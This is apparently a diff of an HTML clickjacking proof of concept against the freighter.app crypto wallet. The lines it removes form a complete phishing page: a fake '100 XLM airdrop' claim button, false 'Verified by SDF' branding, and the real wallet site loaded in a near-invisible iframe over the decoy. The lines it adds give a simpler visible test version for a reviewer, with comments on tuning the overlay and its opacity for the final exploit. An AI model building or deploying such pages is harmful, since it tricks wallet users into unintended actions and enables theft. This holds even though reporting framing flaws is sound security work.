@@ -1,54 +1,39 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Stellar Airdrop - Claim Free XLM</title>
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+<meta name="viewport" content="width=device-width, initial-scale=1">
 <style>
-*{margin:0;padding:0;box-sizing:border-box;font-family:'Inter',-apple-system,sans-serif}
-body{background:#0a0a0f;color:#fff;min-height:100vh}
-.nav{height:64px;display:flex;align-items:center;justify-content:space-between;padding:0 24px;border-bottom:1px solid #1e1e2a;background:rgba(10,10,15,0.8);backdrop-filter:blur(20px)}
-.logo{display:flex;align-items:center;gap:10px;font-weight:600}
-.logo-icon{width:32px;height:32px;background:linear-gradient(135deg,#7c3aed,#3b82f6);border-radius:8px;display:flex;align-items:center;justify-content:center}
-.hero{max-width:1100px;margin:0 auto;padding:60px 24px;display:grid;grid-template-columns:1fr 1fr;gap:40px;align-items:center}
-.hero h1{font-size:44px;line-height:1.1;font-weight:700;background:linear-gradient(180deg,#fff,#a1a1aa);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
-.hero p{color:#a1a1aa;font-size:17px;line-height:1.6;margin:20px 0 32px}
-.card{background:#15151f;border:1px solid #232330;border-radius:16px;padding:24px}
-.claim-area{position:relative;margin-top:24px}
-.claim-btn{width:100%;height:56px;background:#fff;color:#000;border:none;border-radius:28px;font-size:16px;font-weight:600;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px;box-shadow:0 4px 20px rgba(0,0,0,0.3)}
-#victim-wrap{position:relative;width:100%;height:56px}
-#victim-iframe{position:absolute;top:-438px;left:-62%;width:420px;height:900px;border:none;opacity:0.001;z-index:10}
-#decoy-btn{position:absolute;top:0;left:0;width:100%;height:56px;z-index:1}
-#log{max-width:1100px;margin:20px auto;padding:12px 24px;background:#0f0f14;border:1px solid #232330;border-radius:8px;font-size:11px;color:#71717a;font-family:monospace}
-@media(max-width:768px){.hero{grid-template-columns:1fr} #victim-iframe{top:-442px;left:-15%;width:380px}}
+  body { background:#000; color:#fff; font-family: monospace; margin:0; padding:20px; }
+  .wrapper { position: relative; width: 420px; max-width: 90vw; height: 800px; margin: 20px auto; border: 2px solid #333; overflow: hidden; }
+  iframe { width: 100%; height: 100%; border:0; }
+  /* GANTI top/left/width/height ini untuk nge-pas-in */
+  .poc-button {
+    position: absolute;
+    /* posisi ini yang kamu sesuaikan - sekarang dipasin ke area kanan bawah (Get Android) */
+    top: 58%;
+    left: 52%;
+    width: 38%;
+    height: 10%;
+    z-index: 10;
+    background: rgba(255,0,80,0.4); /* untuk PoC jangan 0, biar reviewer lihat */
+    border: 2px dashed red;
+    color: white;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
 </style>
 </head>
 <body>
-<div class="nav">
-<div class="logo"><div class="logo-icon">◈</div> Freighter Airdrop</div>
-<div style="font-size:13px;color:#71717a">Verified by SDF</div>
-</div>
-<div class="hero">
-<div>
-<h1>Claim your<br/>100 XLM Airdrop</h1>
-<p>Early Freighter users are eligible. Verify via official Freighter portal to claim instantly.</p>
-<div class="card">
-<div class="claim-area">
-<div id="victim-wrap">
-<button id="decoy-btn" class="claim-btn">◈ Claim 100 XLM Now</button>
-<iframe id="victim-iframe" src="https://freighter.app/"></iframe>
-</div>
-</div>
-</div>
-</div>
-<div style="height:480px;border:1px solid #1e1e2a;border-radius:24px;overflow:hidden;background:radial-gradient(600px at 70% 20%,rgba(124,58,237,0.15),transparent)"></div>
-</div>
-<div id="log">Loading freighter.app in hidden iframe...</div>
-<script>
-const log=document.getElementById('log');
-const iframe=document.getElementById('victim-iframe');
-iframe.onload=()=>{log.innerHTML+=`<br>[${new Date().toLocaleTimeString()}] freighter.app LOADED - VULNERABLE, can be framed (no X-Frame-Options)`};
-</script>
+  <h3>Clickjacking Test - freighter.app</h3>
+  <p>Parent: 0x403for.github.io<br>Child: https://freighter.app/</p>
+
+  <div class="wrapper">
+    <iframe src="https://freighter.app/"></iframe>
+    <div class="poc-button" onclick="alert('Clicked - PoC Success')">INVISIBLE BUTTON DI SINI</div>
+  </div>
+
+  <p>Untuk final PoC ganti background jadi <code>opacity: 0.01</code>. Jangan pakai <code>opacity: 0</code> karena di beberapa browser tidak ke-click.</p>
 </body>
 </html>
